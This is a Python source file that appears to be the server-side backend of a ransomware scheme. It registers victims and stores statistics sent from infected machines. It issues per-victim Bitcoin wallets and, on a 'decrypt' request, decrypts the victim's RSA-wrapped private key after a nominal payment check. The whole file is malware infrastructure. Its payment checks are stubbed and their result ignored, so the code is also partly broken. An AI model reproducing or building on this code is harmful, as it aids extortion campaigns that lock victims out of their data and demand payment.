from asymmetric_encryption import RSA
from base64 import b64encode, b64decode
from payment import (
    match_bitcoin_address_and_private_key,
    verify_payment,
    generate_bitcoin_address,
)
from db import insert_statistics_to_database
import logging


logger = logging.getLogger(__name__)


def decrypt_rsa_data(encrypted_key):
    logger.info("Decrypting RSA data")
    cipher = RSA()
    unencrypted_local_private_key = b"".join(
        [cipher.decrypt_data(key_part) for key_part in encrypted_key]
    )
    payload = {"key": b64encode(unencrypted_local_private_key).decode("ascii")}
    logger.info(f"Returning Payload: {payload}")
    return payload


def basic_parameter_check(parameters, parameter_type):
    if parameter_type == "initialise":
        initialise_request_parameters = ["client_id", "statistics"]
        print(list(parameters.keys()))
        checks = [list(parameters.keys()) == initialise_request_parameters]

    elif parameter_type == "decrypt":
        decrypt_request_parameters = [
            "victim_private_key",
            "my_wallet_id",
            "victim_wallet_id",
        ]

        checks = [list(parameters.keys()) == decrypt_request_parameters]

    if all(checks):
        print("SUCCESS")
        return True
    
    return False


def bitcoin_checks(my_wallet_id, victim_wallet_id):
    checks = [
        match_bitcoin_address_and_private_key(),
        verify_payment(),
    ]

    if all(checks):
        return True


def unpack_decrypt_request(request_parameters):
    victim_private_key = [
        b64decode(part) for part in request_parameters.get("victim_private_key")
    ]
    my_wallet_id = b64decode(request_parameters.get("my_wallet_id")).decode()
    victim_wallet_id = b64decode(request_parameters.get("victim_wallet_id")).decode()
    return victim_private_key, my_wallet_id, victim_wallet_id


def unpack_initialise_request(request_parameters):
    client_id = request_parameters.get("client_id")
    statistics = request_parameters.get("statistics")
    return client_id, statistics


def process_request(request_parameters, request_type):
    if request_type == "initialise" and basic_parameter_check(request_parameters, request_type):
        client_id, statistics = unpack_initialise_request(request_parameters)
        print("HERE2")
        insert_statistics_to_database(statistics)
        wallet_id = generate_bitcoin_address(client_id)
        return {"client_id": client_id, "wallet_id": wallet_id}

    elif request_type == "decrypt" and basic_parameter_check(request_parameters, request_type):
        (
            victim_private_key,
            my_wallet_id,
            victim_wallet_id,
        ) = unpack_decrypt_request(request_parameters)
        victim_pivate_key = decrypt_rsa_data(victim_private_key)
        bitcoin_checks(my_wallet_id, victim_wallet_id)
        return victim_pivate_key
